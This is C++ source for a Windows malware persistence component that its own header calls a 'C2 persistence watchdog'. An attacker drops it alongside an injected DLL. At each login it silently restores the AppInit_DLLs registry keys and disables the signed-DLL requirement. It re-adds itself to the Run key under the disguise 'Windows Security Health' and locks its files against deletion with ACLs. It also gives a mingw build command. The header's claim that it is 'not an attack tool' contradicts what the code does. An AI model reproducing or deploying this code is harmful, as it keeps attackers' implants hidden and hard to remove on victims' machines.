/**
 * SAFE.cpp — C2 Persistence Watchdog
 *
 * ╔══════════════════════════════════════════════════════════════════╗
 * ║  THIS IS A FAILSAFE — NOT AN ATTACK TOOL.                       ║
 * ║  The attacker never runs this file directly.                    ║
 * ║  It is dropped alongside AppInit_DLLs.dll so the DLL can        ║
 * ║  copy it to %USERPROFILE% and register it as a startup entry.   ║
 * ╚══════════════════════════════════════════════════════════════════╝
 *
 * Lifecycle
 * ─────────
 *  1. Attacker drops AppInit_DLLs.dll + SAFE.exe in the same folder.
 *  2. Attacker loads the DLL (inject / any method).
 *  3. On first DLL load, failsafe_mod::ensure() in the DLL:
 *       • Copies AppInit_DLLs.dll → %USERPROFILE%\AppInit_DLLs.dll
 *       • Copies SAFE.exe         → %USERPROFILE%\SAFE.exe
 *       • Sets AppInit_DLLs registry keys  (DLL auto-loads every boot)
 *       • Adds SAFE.exe to HKCU\Run        (SAFE.exe auto-runs every login)
 *       • ACL-protects both files
 *  4. From this point on Windows runs SAFE.exe automatically at every
 *     user login via HKCU\Software\...\Run.
 *  5. SAFE.exe runs silently in the background and verifies/restores:
 *       • AppInit_DLLs registry keys
 *       • Its own Run key entry
 *       • File ACL protection on both files
 *
 * What SAFE.exe does NOT do
 * ─────────────────────────
 *  • It never prompts UAC or shows any window.
 *  • It never copies the DLL (it can't know where to get it from).
 *  • It is not the initial installer — the DLL is.
 *
 * Modes
 * ─────
 *  SAFE.exe           Silent self-heal (default — used by the Run key)
 *  SAFE.exe /remove   Clean uninstall helper (called by UNDO.exe)
 *
 * Build
 * ─────
 *  x86_64-w64-mingw32-g++ -o SAFE.exe SAFE.cpp \
 *      -ladvapi32 -lshell32 -lshlwapi \
 *      -static -std=c++17 -O2 -mwindows
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <aclapi.h>
#include <string>

// ── Constants ─────────────────────────────────────────────────────────────────

static constexpr const char* DLL_NAME   = "AppInit_DLLs.dll";
static constexpr const char* EXE_NAME   = "SAFE.exe";
static constexpr const char* APINIT_KEY =
    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
static constexpr const char* RUN_KEY    =
    "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
static constexpr const char* RUN_VALUE  = "Windows Security Health";
static constexpr const char* MUTEX_NAME = "Global\\__C2SafeMtx__";

// ── Helpers ───────────────────────────────────────────────────────────────────

static std::string get_userprofile() {
    char buf[MAX_PATH]{};
    if (GetEnvironmentVariableA("USERPROFILE", buf, MAX_PATH)) return buf;
    ExpandEnvironmentStringsA("%HOMEDRIVE%%HOMEPATH%", buf, MAX_PATH);
    return buf;
}

static bool file_exists(const std::string& p) {
    return GetFileAttributesA(p.c_str()) != INVALID_FILE_ATTRIBUTES;
}

// ── Registry helpers ──────────────────────────────────────────────────────────

// Returns true if the value exists and equals expected DWORD; false otherwise.
static bool reg_check_dword(HKEY root, const char* sub, const char* name, DWORD expected) {
    HKEY hk;
    if (RegOpenKeyExA(root, sub, 0, KEY_QUERY_VALUE, &hk) != ERROR_SUCCESS) return false;
    DWORD val = 0, sz = sizeof(val), type = 0;
    bool ok = (RegQueryValueExA(hk, name, nullptr, &type, (BYTE*)&val, &sz) == ERROR_SUCCESS
               && type == REG_DWORD && val == expected);
    RegCloseKey(hk);
    return ok;
}

static bool reg_set_dword(HKEY root, const char* sub, const char* name, DWORD val) {
    HKEY hk;
    if (RegCreateKeyExA(root, sub, 0, nullptr, REG_OPTION_NON_VOLATILE,
                        KEY_SET_VALUE, nullptr, &hk, nullptr) != ERROR_SUCCESS)
        return false;
    bool ok = RegSetValueExA(hk, name, 0, REG_DWORD,
                             (const BYTE*)&val, sizeof(val)) == ERROR_SUCCESS;
    RegCloseKey(hk);
    return ok;
}

static bool reg_set_expand(HKEY root, const char* sub, const char* name, const char* val) {
    HKEY hk;
    if (RegCreateKeyExA(root, sub, 0, nullptr, REG_OPTION_NON_VOLATILE,
                        KEY_SET_VALUE, nullptr, &hk, nullptr) != ERROR_SUCCESS)
        return false;
    bool ok = RegSetValueExA(hk, name, 0, REG_EXPAND_SZ,
                             (const BYTE*)val, (DWORD)strlen(val) + 1) == ERROR_SUCCESS;
    RegCloseKey(hk);
    return ok;
}

static bool reg_set_sz(HKEY root, const char* sub, const char* name, const char* val) {
    HKEY hk;
    if (RegCreateKeyExA(root, sub, 0, nullptr, REG_OPTION_NON_VOLATILE,
                        KEY_SET_VALUE, nullptr, &hk, nullptr) != ERROR_SUCCESS)
        return false;
    bool ok = RegSetValueExA(hk, name, 0, REG_SZ,
                             (const BYTE*)val, (DWORD)strlen(val) + 1) == ERROR_SUCCESS;
    RegCloseKey(hk);
    return ok;
}

// Returns true if the named value exists under the key.
static bool reg_value_exists(HKEY root, const char* sub, const char* name) {
    HKEY hk;
    if (RegOpenKeyExA(root, sub, 0, KEY_QUERY_VALUE, &hk) != ERROR_SUCCESS) return false;
    bool ok = RegQueryValueExA(hk, name, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS;
    RegCloseKey(hk);
    return ok;
}

static void reg_delete_value(HKEY root, const char* sub, const char* name) {
    HKEY hk;
    if (RegOpenKeyExA(root, sub, 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        RegDeleteValueA(hk, name);
        RegCloseKey(hk);
    }
}

// ── File ACL protection ───────────────────────────────────────────────────────
//
//  DENY  DELETE | WRITE_DAC | WRITE_OWNER  → Everyone
//  ALLOW GENERIC_ALL                        → NT AUTHORITY\SYSTEM
//  ALLOW GENERIC_ALL                        → BUILTIN\Administrators
//
static void protect_file(const std::string& path) {
    PSID pEveryone = nullptr, pAdmins = nullptr, pSystem = nullptr;
    SID_IDENTIFIER_AUTHORITY wAuth = SECURITY_WORLD_SID_AUTHORITY;
    SID_IDENTIFIER_AUTHORITY nAuth = SECURITY_NT_AUTHORITY;

    AllocateAndInitializeSid(&wAuth, 1, SECURITY_WORLD_RID,
                             0,0,0,0,0,0,0, &pEveryone);
    AllocateAndInitializeSid(&nAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
                             DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &pAdmins);
    AllocateAndInitializeSid(&nAuth, 1, SECURITY_LOCAL_SYSTEM_RID,
                             0,0,0,0,0,0,0, &pSystem);

    EXPLICIT_ACCESSA ea[3]{};

    ea[0].grfAccessPermissions = DELETE | WRITE_DAC | WRITE_OWNER;
    ea[0].grfAccessMode        = DENY_ACCESS;
    ea[0].grfInheritance       = NO_INHERITANCE;
    ea[0].Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    ea[0].Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea[0].Trustee.ptstrName    = (LPSTR)pEveryone;

    ea[1].grfAccessPermissions = GENERIC_ALL;
    ea[1].grfAccessMode        = GRANT_ACCESS;
    ea[1].grfInheritance       = NO_INHERITANCE;
    ea[1].Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    ea[1].Trustee.TrusteeType  = TRUSTEE_IS_USER;
    ea[1].Trustee.ptstrName    = (LPSTR)pSystem;

    ea[2].grfAccessPermissions = GENERIC_ALL;
    ea[2].grfAccessMode        = GRANT_ACCESS;
    ea[2].grfInheritance       = NO_INHERITANCE;
    ea[2].Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    ea[2].Trustee.TrusteeType  = TRUSTEE_IS_GROUP;
    ea[2].Trustee.ptstrName    = (LPSTR)pAdmins;

    PACL pACL = nullptr;
    if (SetEntriesInAclA(3, ea, nullptr, &pACL) == ERROR_SUCCESS) {
        SetNamedSecurityInfoA(
            (LPSTR)path.c_str(), SE_FILE_OBJECT,
            DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
            nullptr, nullptr, pACL, nullptr
        );
        LocalFree(pACL);
    }
    if (pEveryone) FreeSid(pEveryone);
    if (pAdmins)   FreeSid(pAdmins);
    if (pSystem)   FreeSid(pSystem);
}

static void unprotect_file(const std::string& path) {
    PSECURITY_DESCRIPTOR pSD = nullptr;
    PACL pDACL = nullptr;
    if (GetNamedSecurityInfoA((LPSTR)path.c_str(), SE_FILE_OBJECT,
                              DACL_SECURITY_INFORMATION,
                              nullptr, nullptr, &pDACL, nullptr, &pSD) == ERROR_SUCCESS) {
        SetNamedSecurityInfoA((LPSTR)path.c_str(), SE_FILE_OBJECT,
            DACL_SECURITY_INFORMATION,
            nullptr, nullptr, nullptr, nullptr);
        LocalFree(pSD);
    }
}

// ── Watchdog heal — called on every startup from the Run key ──────────────────
//
// Silently restores anything that was removed while the machine was off.
// Does NOT try to elevate — it works with whatever privilege the user has.
// HKLM writes need admin, so they succeed only if the user is an admin.
// HKCU writes and file ACLs always succeed.
//
static void do_heal() {
    std::string up      = get_userprofile();
    std::string dst_dll = up + "\\" + DLL_NAME;
    std::string dst_exe = up + "\\" + EXE_NAME;

    // ── 1. AppInit_DLLs registry (HKLM — requires admin) ─────────────────────
    if (!reg_check_dword(HKEY_LOCAL_MACHINE, APINIT_KEY, "LoadAppInit_DLLs", 1)) {
        reg_set_expand(HKEY_LOCAL_MACHINE, APINIT_KEY, "AppInit_DLLs",
                       ("C:%HOMEPATH%\\" + std::string(DLL_NAME)).c_str());
        reg_set_dword(HKEY_LOCAL_MACHINE, APINIT_KEY, "LoadAppInit_DLLs",           1);
        reg_set_dword(HKEY_LOCAL_MACHINE, APINIT_KEY, "RequireSignedAppInit_DLLs",  0);
    }

    // ── 2. Own Run key entry (HKCU — always succeeds) ─────────────────────────
    if (!reg_value_exists(HKEY_CURRENT_USER, RUN_KEY, RUN_VALUE))
        reg_set_sz(HKEY_CURRENT_USER, RUN_KEY, RUN_VALUE, dst_exe.c_str());

    // ── 3. Re-apply file ACL protection ───────────────────────────────────────
    if (file_exists(dst_dll)) protect_file(dst_dll);
    if (file_exists(dst_exe)) protect_file(dst_exe);
}

// ── Remove — called by UNDO.exe via /remove ───────────────────────────────────

static void do_remove() {
    std::string up      = get_userprofile();
    std::string dst_dll = up + "\\" + DLL_NAME;
    std::string dst_exe = up + "\\" + EXE_NAME;

    if (file_exists(dst_dll)) { unprotect_file(dst_dll); DeleteFileA(dst_dll.c_str()); }
    if (file_exists(dst_exe))   unprotect_file(dst_exe); // don't delete self

    reg_delete_value(HKEY_LOCAL_MACHINE, APINIT_KEY, "AppInit_DLLs");
    reg_delete_value(HKEY_LOCAL_MACHINE, APINIT_KEY, "LoadAppInit_DLLs");
    reg_delete_value(HKEY_LOCAL_MACHINE, APINIT_KEY, "RequireSignedAppInit_DLLs");
    reg_delete_value(HKEY_CURRENT_USER,  RUN_KEY,    RUN_VALUE);
}

// ── Entry point ───────────────────────────────────────────────────────────────

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
    // One instance at a time
    HANDLE mtx = CreateMutexA(nullptr, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (mtx) CloseHandle(mtx);
        return 0;
    }

    std::string cmd(lpCmdLine ? lpCmdLine : "");

    if (cmd.find("/remove") != std::string::npos)
        do_remove();
    else
        do_heal();   // default: silent watchdog heal (run by Windows at startup)

    CloseHandle(mtx);
    return 0;
}
